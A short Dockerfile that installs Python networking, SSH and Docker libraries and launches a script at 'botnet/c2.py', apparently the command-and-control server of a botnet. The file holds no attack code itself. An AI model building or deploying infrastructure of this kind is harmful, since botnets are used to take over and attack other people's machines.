FROM python:3.10-slim
WORKDIR /app
COPY . /app
RUN pip install --no-cache-dir aiohttp paramiko redis docker asyncssh
CMD ["python3", "botnet/c2.py"]
